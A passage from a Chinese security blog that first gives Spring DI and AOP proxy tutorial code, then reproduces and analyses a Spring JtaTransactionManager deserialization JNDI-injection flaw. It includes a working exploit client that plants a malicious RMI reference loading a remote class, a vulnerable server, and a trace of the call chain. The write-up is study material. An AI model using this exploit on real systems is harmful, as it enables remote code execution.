class="keyword">return</span> list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setList</span><span class="params">(List list)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.list = list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Properties <span class="title">getPro</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> pro;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPro</span><span class="params">(Properties pro)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.pro = pro;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">beans</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//SPRING//DTD BEAN//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.springframework.org/dtd/spring-beans.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"di"</span> <span class="attr">class</span>=<span class="string">"com.sw.action.DI"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- List注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Set注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"set"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Map注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>one<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>two<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>three<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Properties注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>one<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>two<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span>three<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用函数取出内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sw.action.DI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDI</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ApplicationContext actx = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">    <span class="string">"config-di.xml"</span>);</span><br><span class="line">  DI di = (DI) actx.getBean(<span class="string">"di"</span>);</span><br><span class="line">  <span class="comment">// 打印这些集合</span></span><br><span class="line">  System.out.println(di.getList());</span><br><span class="line">  System.out.println(di.getSet());</span><br><span class="line">  System.out.println(di.getMap());</span><br><span class="line">  System.out.println(di.getPro());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-AOP思想"><a href="#Spring-AOP思想" class="headerlink" title="Spring AOP思想"></a>Spring AOP思想</h3><p>在写AOP前先先来写下三种Java中的代理：静态代理，动态代理，CGLIB代理</p>
<ul>
<li>静态代理：<strong>静态代理需要实现目标对象的相同接口，那么可能会导致代理类会非常非常多，维护起来相对麻烦</strong></li>
<li>动态代理：<strong>目标对象一定是要有接口的，没有接口就不能实现动态代理</strong></li>
<li>cglib代理：<strong>为了解决动态代理一定需要接口的问题，通过cglib代理代理的对象不需要接口</strong></li>
</ul>
<h4 id="手动实现AOP编程"><a href="#手动实现AOP编程" class="headerlink" title="手动实现AOP编程"></a>手动实现AOP编程</h4><p>IUser接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AOP类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理工厂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//维护目标对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//维护关键点代码的类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AOP aop;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProxyInstance</span><span class="params">(Object target_, AOP aop_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标对象和关键点代码的类都是通过外界传递进来</span></span><br><span class="line">        target = target_;</span><br><span class="line">        aop = aop_;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(),</span><br><span class="line">                <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">                        aop.begin();</span><br><span class="line">                        Object returnValue = method.invoke(target, args);</span><br><span class="line">                        aop.close();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> returnValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注解方式实现AOP"><a href="#注解方式实现AOP" class="headerlink" title="注解方式实现AOP"></a>注解方式实现AOP</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"aa"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启aop注解方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>切面类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//指定为切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//里面的值为切入点表达式</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现接口的UserDao类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">implements</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"DB:保存用户"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext ac =</span><br><span class="line">                <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"aa/applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里得到的是代理对象....</span></span><br><span class="line">        IUser iUser = (IUser) ac.getBean(<span class="string">"userDao"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(iUser.getClass());</span><br><span class="line"></span><br><span class="line">        iUser.save();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="通过JNDI注入实现Spring-Framework反序列化"><a href="#通过JNDI注入实现Spring-Framework反序列化" class="headerlink" title="通过JNDI注入实现Spring Framework反序列化"></a>通过JNDI注入实现Spring Framework反序列化</h3><p>漏洞复现项目：</p>
<p><a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
<p>Client端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">      String localAddress= <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">      Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">      ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">      registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">      Socket socket = <span class="keyword">new</span> Socket(localAddress,port);</span><br><span class="line">      System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">      String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line"></span><br><span class="line">      org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">      object.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">      ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">      objectOutputStream.writeObject(object);</span><br><span class="line">      objectOutputStream.flush();</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Server端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">			System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line">			<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">				Socket socket=serverSocket.accept();</span><br><span class="line">				System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());</span><br><span class="line">				ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Object object = objectInputStream.readObject();</span><br><span class="line">					System.out.println(<span class="string">"Read object "</span>+object);</span><br><span class="line">				&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">					System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地8000端口开启Web服务，并将ExportObject.class放在Web服务下</p>
<p>先运行Server端，再运行Client端</p>
<p><img src="https://s2.ax1x.com/2020/03/06/3b5BGt.png" alt="3b5BGt.png"></p>
<h4 id="漏洞调用链分析"><a href="#漏洞调用链分析" class="headerlink" title="漏洞调用链分析"></a>漏洞调用链分析</h4><p>跟进org.springframework.transaction.jta.JtaTransactionManager下readobject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">    <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">    initUserTransactionAndTransactionManager();</span><br><span class="line">    initTransactionSynchronizationRegistry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进initUserTransactionAndTransactionManager()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA UserTransaction from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">			<span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = retrieveUserTransaction();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction at its default JNDI location.</span></span><br><span class="line">				<span class="keyword">this</span>.userTransaction = findUserTransaction();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA TransactionManager from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.transactionManagerName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = lookupTransactionManager(<span class="keyword">this</span>.transactionManagerName);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = retrieveTransactionManager();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectTransactionManager) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction object that implements TransactionManager,</span></span><br><span class="line">				<span class="comment">// and check fallback JNDI locations otherwise.</span></span><br><span class="line">				<span class="keyword">this</span>.transactionManager = findTransactionManager(<span class="keyword">this</span>.userTransaction);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If only JTA TransactionManager specified, create UserTransaction handle for it.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">this</span>.userTransaction = buildUserTransaction(<span class="keyword">this</span>.transactionManager);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进lookupUserTransaction函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> getJndiTemplate().lookup(userTransactionName, UserTransaction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(</span><br><span class="line">				<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, ex);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着跟进getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</p>
<p>进一步跟进lookup</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">			Object located = ctx.lookup(name);</span><br><span class="line">			<span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(</span><br><span class="line">						<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> located;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个lookup函数正是造成JNDI注入的lookup函数，在调用链中，我们可以通过userTransactionName属性值进行JNDI注入，而在client端，我们可以通过调用setUserTransactionName()函数去设置这个属性值，将其设置为我们的userTransactionName属性值，也就是我们设置的恶意RMI服务，进而造成JNDI注入。</p>
<p><strong>最根本的原因也就是在于org.springframework.transaction.jta.JtaTransactionManager类对readObject方法进行了重写，对JDNI注入中的lookup函数进行调用，而lookup的参数我们是可以控制的，所以会导致通过反序列化导致JNDI注入。</strong></p>
<p>PS：吐槽一下..在家学习效率可真太低了…一天的量感觉得分四五天…</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd</a></p>
<p><a href="https://segmentfault.com/a/1190000011291179" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011291179</a></p>
<p><a href="https://blog.csdn.net/Mr_Ming_/article/details/80556066" target="_blank" rel="noopener">https://blog.csdn.net/Mr_Ming_/article/details/80556066</a></p>
<p><a href="https://www.cnblogs.com/xdp-gacl/p/4249939.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/4249939.html</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkCMF任意内容包含漏洞复现分析</title>
    <url>/2019/10/27/ThinkCMF%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
